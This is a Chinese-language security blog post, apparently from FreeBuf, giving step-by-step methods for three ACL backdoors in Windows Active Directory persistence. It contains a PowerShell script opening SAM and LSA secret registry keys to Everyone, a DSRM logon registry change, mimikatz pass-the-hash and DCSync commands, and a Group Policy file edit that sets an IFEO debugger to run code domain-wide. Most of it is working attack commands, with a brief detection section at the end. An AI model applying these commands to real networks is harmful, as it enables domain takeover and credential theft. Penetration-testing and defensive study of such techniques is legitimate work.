***本文作者：R1ngk3y，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

## 前言

 **在域环境中配置ACL后门，隐蔽性较强，不容易被发现，适合域环境维持权限，本文介绍常用的三种。**

## 一、基于注册表ACL后门

 **作用：** 直接域控制器上的本地管理员hash。

 **实现思路：** 在域控制器上将hklm的特定键值分配everyone读取权限

> 感谢harmj0y大佬，已经把这个过程武器化了，地址： <https://github.com/HarmJ0y/DAMP>，代码写得很完美 :)

手动编写powershell脚本如下(会应用到子目录)：

    
    
    $Keys = @(
                'SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg',
                'SYSTEM\CurrentControlSet\Control\Lsa\JD',
                'SYSTEM\CurrentControlSet\Control\Lsa\Skew1',
                'SYSTEM\CurrentControlSet\Control\Lsa\Data',
                'SYSTEM\CurrentControlSet\Control\Lsa\GBG',
                'SECURITY',
                'SAM\SAM',
                'SECURITY\Policy\Secrets\NL$KM\CurrVal'
    		
    		
    )
    
    ForEach($Key in $Keys) {
    
    	$reg_path="HKLM:\"+$Key
    	write-output $reg_path
    	
    	
    	$REG = Get-Acl $reg_path
    	$Rule = New-Object System.Security.AccessControl.RegistryAccessRule ("Everyone","FullControl","Allow") 
    	$REG.SetAccessRule($Rule) 
    	$REG |Set-Acl -Path $reg_path
    	$Dir = Get-Childitem $reg_path -Recurse 
    	
    }

修改系统关键注册表需要system权限，本地管理员权限下执行如下以获取一个system shell：

    
    
    psexec.exe -accepteula -s -i -d cmd.exe

![获取一个system
shell](https://image.3001.net/images/20181120/1542721141_5bf40e75794ba.png!small)

在域控制器上执行上面脚本或导入<https://github.com/HarmJ0y/DAMP/blob/master/Add-RemoteRegBackdoor.ps1>脚本执行：

    
    
    Add-RemoteRegBackdoor -ComputerName client.external.local -Trustee 'S-1-1-0' -Verbose 

然后就是在普通用户机器上读ntlm hash。

普通域用户机器下载<https://raw.githubusercontent.com/HarmJ0y/DAMP/master/RemoteHashRetrieval.ps1>这个脚本,本来想自己动手写一个的，但是解密SAM内容这个步骤太复杂了，放弃啦
:( 。

执行获取域控制器本地sam文件里的hash：

    
    
    Get-RemoteLocalAccountHash -ComputerName ad1 -Verbose

![获取域控制器本地sam文件里的hash](https://image.3001.net/images/20181120/1542721157_5bf40e85c10b4.png!small)

这样只要是个域用户都可以获取到域控制器的本地管理员administrator的hash，但是有一点要注意，就是域控制器的本地管理员账户不能直接pass
the hash，这个是域控制器SAM文件中账户的ntlm hash，或者叫它DSRM账户。

在域控制器上执行如下以允许DSRM账户进行远程访问（不用重启）：

    
    
    reg add HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2

执行后就能对域控制器pass the hash。

用mimikatz进行hash注入：

    
    
    mimikatz "privilege::debug" "sekurlsa::pth /domain:ad1 /user:Administrator /ntlm:5a6b69843c8xxxxxc73dd3f1592acab2" exit

这样就可以持续访问域控制器了。

![持续访问域控制器](https://image.3001.net/images/20181120/1542721175_5bf40e976407c.png!small)

## 二、基于域策略文件权限后门

 **作用** ：部署策略文件无视防火墙一键种马。

域里机器每过90+（0-30分钟）会访问域控制器的C:\Windows\SYSVOL\sysvol\domain.com\Policies
以更新它们的策略。

![更新它们的策略](https://image.3001.net/images/20181120/1542721189_5bf40ea55355a.png!small)

配置Policies的文件夹权限为everyone完全控制，在域控制器上执行：

    
    
    cacls C:\Windows\SYSVOL\sysvol\z3r0.com\Policies /e /t /c /g "EveryOne":f

![在域控制器上执行](https://image.3001.net/images/20181120/1542721201_5bf40eb1ac152.png!small)

然后查询某台机器对应的是哪一个策略文件，下载powerview脚本然后执行：

    
    
    Get-NETGPO -ComputerName tom-PC.z3r0.com |fl gpcfilesyspath

![下载powerview脚本然后执行](https://image.3001.net/images/20181120/1542721217_5bf40ec12bdf7.png!small)

打开\\\z3r0.com\SYSVOL\z3r0.com\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows
NT\SecEdit\GptTmpl.inf 添加如下在文件末尾：

    
    
    [Registry Values] MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhost.exe\Debugger=1,c:\windows\system32\calc.exe [Version] signature="$CHICAGO$" Revision=1

选择taskhost.exe作为调试进程是因为当目标机器刷新域策略的时候会调用taskhost进程，所以直接就能触发了。

手动刷新策略gpupdate /force：

![手动刷新策略](https://image.3001.net/images/20181121/1542769834_5bf4ccaa817d6.png!small)

## 三、配置dcsync后门

在z3r0.com上右键把高级功能选上：

![把高级功能选上](https://image.3001.net/images/20181120/1542721242_5bf40eda4e2b4.png!small)

然后再右键属性就会看到安全了。

![看到安全](https://image.3001.net/images/20181120/1542721256_5bf40ee855429.png!small)

把everyone设置成完全控制，威力无穷。

![把everyone设置成完全控制](https://image.3001.net/images/20181120/1542721275_5bf40efb9b933.png!small)

最后随便找个账号就能使用dcsync了：

    
    
    mimikatz.exe "Lsadump::dcsync /domain:z3r0.com /user:administrator" exit

![](https://image.3001.net/images/20181120/1542721289_5bf40f0998c7a.png!small)

### 检测清理

1、访问编写脚本定时检测注册表路径(HKLM\System\CurrentControlSet\Control\Lsa\DSRMAdminLogonBehavior)，DSRMAdminLogonBehavior这个键值
默认不存在，如果发现存在该键值那么可能已经被攻击者利用了。

2、检测C:\Windows\SYSVOL\sysvol\domain.com\Policies目录以及子目录文件权限，如果某个用户被赋予特殊权限，那么可能是攻击者进行的操作

3、查看域控制器上是否存在特殊权限用户，如下图所示：

![查看域控制器上是否存在特殊权限用户](https://image.3001.net/images/20181123/1542953056_5bf798603e61d.png!small)

## 总结

本文介绍了常用的几种配置ACL在内网里留后门的方法，后门在渗透测试中发挥的作用至关重要，学习掌握后门技术是安全人员必不可少的技能之一。

 ***本文作者：R1ngk3y，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

